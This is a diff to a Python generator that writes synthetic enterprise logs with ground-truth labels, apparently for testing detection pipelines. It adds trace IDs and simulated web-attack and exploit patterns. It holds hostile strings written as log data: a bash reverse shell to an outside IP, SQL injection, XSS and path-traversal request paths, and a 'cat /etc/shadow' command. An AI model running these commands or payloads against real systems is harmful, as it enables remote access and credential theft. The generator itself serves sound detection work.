@@ -12,7 +12,9 @@ class EnterpriseLogGenerator:
     def __init__(self):
         self.hosts = DATA_POOLS["hosts"]
         self.users = DATA_POOLS["users"]
-        self.internal_ips = [f"10.50.1.{i}" for i in range(10, 250)]
+        self.internal_ips = []
+        for subnet in DATA_POOLS["subnets"]:
+            self.internal_ips.extend([f"{subnet}.{i}" for i in range(1, 250)])
         
         self.destinations = {
             "http": os.path.join(BASE_DIR, "nginx", "access.log"),
@@ -27,7 +29,7 @@ class EnterpriseLogGenerator:
         # --- FIXED: Ensure the 'meta' directory exists ---
         os.makedirs(os.path.dirname(self.destinations["ground_truth"]), exist_ok=True)
 
-    def write(self, category, log, intent="background", outcome="success"):
+    def write(self, category, log, intent="background", outcome="success", trace_id=None):
         # 1. Write the raw log to the file (what Vector sees)
         target_file = self.destinations.get(category)
         with open(target_file, "a") as f:
@@ -37,6 +39,7 @@ class EnterpriseLogGenerator:
         if intent != "background":
             meta = {
                 "timestamp": datetime.now().isoformat(),
+                "trace_id": trace_id,
                 "category": category,
                 "class_uid": self._get_class_uid(category), 
                 "intent": intent,     
@@ -50,8 +53,14 @@ class EnterpriseLogGenerator:
     def _get_class_uid(self, category):
         return {"http": 4002, "auth": 3002, "network": 4001, "system": 1007, "api": 6003}.get(category, 0)        
     
-    def gen_4002_http(self, ip=None, status=None, path=None, intent="background"):
-        ip = ip or random.choice(self.internal_ips)
+    def gen_4002_http(self, ip=None, status=None, path=None, intent="background", trace_id=None):
+
+        trace_id = trace_id or uuid.uuid4().hex[:8]
+        ts = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
+
+        if ip is None:
+            ip = random.choice(self.internal_ips)
+
         status = status or random.choices(["200", "404", "500", "302", "401"], weights=[75, 10, 5, 5, 5])[0]
         path = path or random.choice(DATA_POOLS["endpoints"])
         agent = random.choice(DATA_POOLS["user_agents"])
@@ -60,7 +69,7 @@ class EnterpriseLogGenerator:
         
         log = f'{ip} - - [{ts}] "GET {path} HTTP/1.1" {status} {size} "-" "{agent}"'
         outcome_str = "success" if str(status).startswith(("2", "3")) else "failure"
-        self.write("http", log, intent=intent, outcome=outcome_str)
+        self.write("http", log, intent=intent, outcome=outcome_str, trace_id=trace_id)
 
     def gen_4001_network(self, action=None, src_ip=None, dst_ip=None, dst_port=None, intent="background"):
         action = action or random.choices(["ALLOW", "DENY"], weights=[85, 15])[0]
@@ -126,16 +135,17 @@ class EnterpriseLogGenerator:
         log = f'{ts} {host} {msg}'
         self.write("system", log, intent=intent, outcome="success")
 
-    def gen_6003_api(self, method=None, endpoint=None, status=None, intent="background"):
+    def gen_6003_api(self, method=None, endpoint=None, status=None, intent="background", trace_id=None):
+        trace_id = trace_id or uuid.uuid4().hex[:8]
         ts = datetime.now().isoformat()
         method = method or random.choice(["GET", "POST", "PUT", "DELETE"])
         endpoint = endpoint or random.choice(DATA_POOLS["api_endpoints"])
         status = status or random.choices([200, 201, 400, 403, 503], weights=[80, 10, 5, 3, 2])[0]
         lat = random.randint(5, 500)
         
-        log = f'{ts} api-srv: method={method} endpoint={endpoint} status={status} latency={lat}ms'
+        log = f'{ts} api-srv: method={method} endpoint={endpoint} status={status} latency={lat}ms trace_id={trace_id}'
         outcome_str = "success" if str(status).startswith("2") else "failure"
-        self.write("api", log, intent=intent, outcome=outcome_str)
+        self.write("api", log, intent=intent, outcome=outcome_str, trace_id=trace_id)
 
     def normal_traffic(self):
         funcs = [self.gen_4002_http, self.gen_4001_network, self.gen_1006_scheduled_job, 
@@ -152,6 +162,34 @@ class EnterpriseLogGenerator:
         time.sleep(0.5)
         self.gen_1006_scheduled_job(cmd="/bin/bash -i >& /dev/tcp/45.33.22.11/443 0>&1", user="backdoor_user", intent="persistence")
 
+    def attack_pattern_webapp(self, target_ip =None):
+        target_ip = target_ip or random.choice(self.internal_ips)
+        attacker_ip = f"192.168.1.{random.randint(2,254)}"
+        print(f"💉 Injecting Web Attacks against {target_ip}...")
+        sqli_path = "/api/v1/user?id=1' OR '1'1"
+        self.gen_4002_http(ip=attacker_ip, path=sqli_path, status="200", intent="exploitation")
+
+        xss_path = "/api/v1/search?q=<script>alert('xss')</script>"
+        self.gen_4002_http(ip=attacker_ip, path=xss_path, status="200", intent="exploitation")
+
+        traversal_path= "/static/../../etc/passwd"
+        self.gen_4002_http(ip=attacker_ip, path=traversal_path, status="403", intent="exploitation")
+
+    def attack_pattern_distributed_exploit(self):
+        attacker_ip = f"185.220.101.{random.randint(1,254)}"
+        op_trace = uuid.uuid4().hex[:12]
+        print(f"Simulating Distributed Attack Trace: {op_trace}")
+
+        self.gen_4001_network(src_ip=attacker_ip, action="ALLOW", intent="recon", dst_port=443)
+        self.gen_4002_http(ip=attacker_ip, path="/api/v1/debug", status="200", intent="exploitation", trace_id=op_trace)
+        time.sleep(0.2)
+
+        self.gen_6003_api(endpoint="/v2/internal/config", status=200, intent="exploitation", trace_id=op_trace)
+        time.sleep(0.2)
+        self.gen_1007_process_activity(proc_name=f"sh -c 'cat /etc/shadow' [trace:{op_trace}]", intent="exfiltration")
+
+
+
 if __name__ == "__main__":
     gen = EnterpriseLogGenerator()
     print(f"🚀 High-Variation Multi-File Simulator started.")
@@ -163,6 +201,12 @@ if __name__ == "__main__":
                 time.sleep(random.uniform(0.05, 0.2))
 
             if random.random() > 0.85:
-                gen.attack_pattern_persistence(attacker_ip=f"185.220.101.{random.randint(1,254)}")
+                if random.random() > 0.7:
+                    gen.attack_pattern_persistence(attacker_ip=f"185.220.101.{random.randint(1,254)}")
+                elif random.random() > 0.5:
+                    gen.attack_pattern_webapp()
+                else:
+                    gen.attack_pattern_distributed_exploit()
+
     except KeyboardInterrupt:
         print("\n🛑 Simulation stopped.")
